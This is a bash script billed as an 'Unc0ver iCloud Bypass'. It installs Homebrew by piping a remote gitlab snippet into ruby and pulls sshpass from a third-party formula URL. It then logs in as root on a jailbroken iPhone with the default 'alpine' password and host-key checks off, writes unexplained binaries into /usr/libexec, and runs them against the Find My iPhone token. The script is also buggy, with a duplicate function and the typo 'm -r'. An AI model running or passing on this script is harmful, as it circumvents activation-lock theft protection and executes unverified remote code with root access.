#!/bin/bash

echo "==> Checking for brew..."

which brew
if [ $? -ne 0 ]; then
    echo "==> You do not have Homebrew installed on your Mac."
    read -p "==> Homebrew is required to use this tool. Press enter/return to automatically install it... "
    /usr/bin/ruby -e "$(curl -fsSL https://gitlab.com/snippets/1909941/raw)"
fi

echo "==> Installing dependencies..."
brew install libusbmuxd https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb

clear
echo "**************** Unc0ver iCloud Bypass ****************"
echo
echo "=> By TheMobileStore:"
echo
echo "==> Setting up connection..."
iproxy 2222 44 &

runcmd () {
    sshpass -p alpine scp -o StrictHostKeyChecking=no -P 2222 Desktop/drmoe.tar.gz root@localhost:/tmp/drmoe.tar.gz
} &

runcmd () {
    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2222 "$1"
}

echo "==> Setting files..."
runcmd "mount -o rw,union,update / && rm -r /tmp/drmoe && mkdir /tmp/drmoe && tar xzf /tmp/drmoe.tar.gz -C /tmp/drmoe/ && mv /tmp/drmoe/kawabonza /usr/libexec/kawabonza && mv /tmp/drmoe/just4fun /usr/libexec/just4fun && mv /tmp/drmoe/sqlite3 /usr/libexec/sqlite3 && mv /tmp/drmoe/tdump /usr/libexec/tdump && m -r /tmp/drmoe && chmod a+x /usr/libexec/kawabonza && chmod a+x /usr/libexec/just4fun && chmod a+x /usr/libexec/sqlite3 && chmod a+x /usr/libexec/tdump && /usr/libexec/just4fun 90b01ce59f2336cbdaa6fcf90fc8c05983a8aea5 && /usr/libexec/kawabonza -f \"com.apple.account.DeviceLocator.find-my-iphone-app-token\" exit"


echo
echo "==> Done! :)"